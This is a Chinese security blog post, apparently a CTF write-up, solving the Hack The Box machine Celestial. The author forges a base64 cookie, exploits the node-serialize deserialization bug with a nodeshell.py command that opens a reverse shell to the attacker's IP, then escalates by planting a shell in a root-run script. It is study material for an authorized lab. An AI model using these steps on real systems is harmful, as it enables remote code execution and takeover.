@@ -1,0 +1,151 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NrHH8oAB2NLPf_P7R8Gz-A)
+
+一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)
+
+  
+
+  
+
+大家好，这里是 **大余安全** 的第 **126** 篇文章，本公众号会每日分享攻防渗透技术给大家。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/c6lNmDMELgVefhqyswkhNcG53sbopmNFb6w6BGUZCXq83PjE80maj43XT7BjARoN3xKWuFdAc2IBPs0urI5ktA/640?wx_fmt=png)
+
+靶机地址：https://www.hackthebox.eu/home/machines/profile/130
+
+靶机难度：中级（4.8/10）
+
+靶机发布日期：2018 年 8 月 25 日
+
+靶机描述：
+
+Celestial is a medium difficulty machine which focuses on deserialization exploits. It is not the most realistic, however it provides a practical example of abusing client-size serialized objects in NodeJS framework.
+
+请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。
+
+  
+
+一、信息收集
+
+![](https://mmbiz.qpic.cn/mmbiz_png/Clq0o4fE5u6X5A1maTmqcvtEibdrsDO41kZPibRCHsX3Koj69GFK2qOyPwdcrgcDkHklrdJzBCiaQPuMVe11oSYHA/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QW1U7wqRuYLvoic06oY6l1j2U14ibNHJXBXruDhicsNXbkmDWcB5upMdXA/640?wx_fmt=png)
+
+可以看到靶机的 IP 是 10.10.10.85....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QiaiboI5iaOzcUY0Idaz1iba5FnQhiaBoEB3BjVk9B2hHzhia00iaw0eicPjvkg/640?wx_fmt=png)
+
+Nmap 发现了 3000 端口运行着 http 服务，Node.js 框架....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QzuaTxJNqjQrxc9GbNU6EL8iciclY842CDXcFnSldLcRMicU5ibASFGo67Q/640?wx_fmt=png)
+
+刚进入发现 404，查看前端源码也没信息....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7Qje65Miccbg8gQ5NGPA7TFIYRdAwFyqLWicNELRdA3auBoEljLqh8qcIA/640?wx_fmt=png)
+
+在刷新页面后更新了信息... 显示以上结果... 前端还是没信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QBJ1ReibpicO6kcm7Aw0lVZzXL8Oes5hoISot6nnnQHC79icfVUrtLB0lg/640?wx_fmt=png)
+
+burpsuit 拦截发现了一串 base64 值....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QiaicqJMRx94usqC90lJ3DvEQKB5z4MG9XEXR63nepCZuq7KSp8SgouSw/640?wx_fmt=png)
+
+可以知道这是一个 Node.js Express 框架，根据输出结果，可以修改 cookie 变换输出值...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QJZWhfMb8lK6XEVCticXlLaO4HB2b7NY80Gc68b7BGf5SlrNAVcvB3EA/640?wx_fmt=png)
+
+```
+echo eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ== | base64 -d | sed 's/"2"/"5"/g' | base64 -w0
+```
+
+通过 "num":"2" 更改 "num":"5" 并使用 base64 对其进行了编码输入到 burp 中，输出结果知道这是 node-serialize 模块导致的...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QLHLNZcZC2IHQWVbMZ79Thbib3NpFG9GiacPH6byt2KvooL7AMUWtia2PQ/640?wx_fmt=png)
+
+这里更直观的看到这是由 node-serialize 模块导致的，该模块是在 unserialize 函数模块中导致无法验证用户提供的输入，从而执行了 JSON 值内的所有内容...
+
+开始利用反序列化漏洞提权...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7Qn7xEIYc1Vqmxee7HGwYcNxCWic03GibH0VUUqibEEJd9Ufia8KywDOOUxQ/640?wx_fmt=png)
+
+```
+https://hd7exploit.wordpress.com/2017/05/29/exploiting-node-js-deserialization-bug-for-remote-code-execution-cve-2017-5941/
+```
+
+这里详细讲述了 node-serialize 模块的利用方式...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QyBzZSlsmu2WF3CaFrulShyP6zFXV4Gx90Y6PyCsl8s0GYObfcYLOlQ/640?wx_fmt=png)
+
+按照文章利用即可...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7Qo1tGmdEDtkPkuxxnUIEIHhOYO8oEppLgLbzRcgTthFpMqoF2KgIC0w/640?wx_fmt=png)
+
+```
+sudo python nodeshell.py -r -h 10.10.14.51 -p 6666 -e -o
+```
+
+创建好 shellcode....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7Qeo8W8kU2CsMsaSiclqsmicy2RtcPS69Rfd8WAg8A3z5gZnTo7ibSrzlicA/640?wx_fmt=png)
+
+然后利用 burpsuit 注入 shell 即可...
+
+成功获得反向外壳....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QDlmJCj5cWfiaCxauLkWKxqNK84kpHDnd46lgtfmFyP0zcU2sHFE7osw/640?wx_fmt=png)
+
+获得了 user_flag 信息....
+
+查看到还存在 script.py 脚本信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7Qq8wBohpaGoVLk4pDgOMFf9CoXiaELib38rTe41srXYpib3uiamLoz4oErg/640?wx_fmt=png)
+
+该脚本很可疑，我下载了 pspy 监测后端进程... 上传
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QHLy3fQQiaTT9kKDib4gMcuKq0Z1oGZNXqAsh0UYjiaSV2YPwhheHbZe8A/640?wx_fmt=png)
+
+果然发现了该程序是在运行了... 但不是 root 权限？
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7QLjT9Dfk19eBrM7wFjVM4COKvTzWKPfpoyicQQoQ9v8aGNJzwfq8oN0g/640?wx_fmt=png)
+
+查看了后端日志后... 发现该程序在执行 root 权限.... 尝试植入 shell
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7Q3QQzb8Xr0zSaQD1Vt5LXsOLZQfB4PibMJNAtFngcH5ibJ9az4w3wgmlA/640?wx_fmt=png)
+
+利用简单 shell，echo 植入即可....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMcExUpOO4eNfb9lU10mA7Q0rMicgR6nvE8CqOBG1yZE5GwjxCj9QNa0NsiamL1PvN7Hez0IDpBNT1w/640?wx_fmt=png)
+
+等待了好久... 估计 10 分钟... 才获得了反向外壳...pspy32 监测一直没运行 script.py...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/sGWlDp8sFCl67vCmcZr3JtQP0jB8suQiaKaKCVYPOezloiaicS8xMkAriaAQd3dTOPXicBTVStlX66kEffEWJOiczUTA/640?wx_fmt=png)
+
+获得了 root 权限，并获得了 root_flag 信息...
+
+简单的提权...
+
+由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。
+
+如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/o62ddIpxjBd0kv6p3zb6uf1GiaCo9PiaF12hWQQSurxFPuVIDtsNTgUpjjvmib7GxKXNePVMAwJfzuib52MWoORPYg/640?wx_fmt=png)
+
+如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~
+
+![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)
+
+随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**
+
+欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！
+
+![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  
+
+大余安全
+
+一个全栈渗透小技巧的公众号
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)
